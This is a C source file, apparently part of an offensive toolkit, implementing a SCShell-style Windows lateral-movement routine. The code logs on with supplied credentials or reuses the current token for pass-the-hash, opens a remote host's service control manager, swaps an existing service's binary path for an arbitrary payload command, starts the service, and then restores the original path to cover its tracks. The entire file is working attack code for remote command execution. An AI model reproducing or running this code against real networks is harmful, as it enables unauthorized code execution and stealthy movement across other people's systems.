// @Author: y11en 
// @date: 2021/11/15


#include <Windows.h>
#include "one.h"

int SrvExecImp(const char* host, const char* domain,
    const char* user, const char* pwd,
    const char* srvname, const char* payload)
{

    // learn from: https://github.com/Mr-Un1k0d3r/SCShell

    LPQUERY_SERVICE_CONFIGA lpqsc = NULL;
    SC_HANDLE schService = NULL;
    LPSTR originalBinaryPath = NULL;
    SC_HANDLE schManager = NULL;

    HANDLE hToken = NULL;
    BOOL bResult = FALSE;
    int iRet = -1;
    DWORD dwSize = 0;
    DWORD dwResult = 0;
    DWORD dwLpqscSize = 0;

    if (!host || !domain || !srvname || !payload)
    {
        return iRet;
    }

    // 1. login 
    if (user)
    {
#define LOGON32_LOGON_NEW_CREDENTIALS 9
        bResult = LogonUserA(user, domain, pwd, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
    }
    else
    {
        // printf("Using current process context for authentication. (Pass the hash)\n");
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
        {
            bResult = FALSE;
        }
    }

    if (!bResult) goto _Exit;

    // 2.  模拟当前登录用户的token
    bResult = ImpersonateLoggedOnUser(hToken);
    if (!bResult) goto _Exit;

    // 3. 打开远程服务管理器
    schManager = OpenSCManagerA(host, NULL, SC_MANAGER_ALL_ACCESS);
    if (schManager == NULL) goto _Exit;


    // printf("Opening %s\n", srvname);
    schService = OpenServiceA(schManager, srvname, SERVICE_ALL_ACCESS);
    if (schService == NULL) goto _Exit;

    // printf("SC_HANDLE Service 0x%p\n", schService);

    // 5. 查询
    QueryServiceConfigA(schService, NULL, 0, &dwSize);
    if (dwSize <= 0) goto _Exit;

    // This part is not critical error will not stop the program
    dwLpqscSize = dwSize;


    // 6. 取出原始路径
    // printf("LPQUERY_SERVICE_CONFIGA need 0x%08x bytes\n", dwLpqscSize);
    lpqsc = (LPQUERY_SERVICE_CONFIGA)GlobalAlloc(GPTR, dwSize);
    if (!lpqsc) goto _Exit;


    bResult = QueryServiceConfigA(schService, lpqsc, dwLpqscSize, &dwSize);
    if (!bResult) goto _Exit;

    originalBinaryPath = lpqsc->lpBinaryPathName;
    // printf("Original service binary path \"%s\"\n", originalBinaryPath);

    // 7. 改变路径
    bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);
    if (!bResult) goto _Exit;

    // printf("Service path was changed to \"%s\"\n", payload);

    // 8. 启动服务
    bResult = StartServiceA(schService, 0, NULL);
    dwResult = GetLastError();
    if (!bResult && dwResult != 1053)  goto _Exit;

    // 9. 还原路径
    if (dwLpqscSize) {
        bResult = FALSE;
        bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
        if (!bResult) {
            //// printf("ChangeServiceConfigA failed to revert the service path. %ld\n", GetLastError());
            // ExitProcess(0);
            goto _Exit;
        }
        // printf("Service path was restored to \"%s\"\n", originalBinaryPath);

        iRet = 0;
    }


_Exit:
    if (lpqsc) GlobalFree(lpqsc);
    if (schManager) CloseServiceHandle(schManager);
    if (schService) CloseServiceHandle(schService);
    if (hToken) CloseHandle(hToken);
    return iRet;

}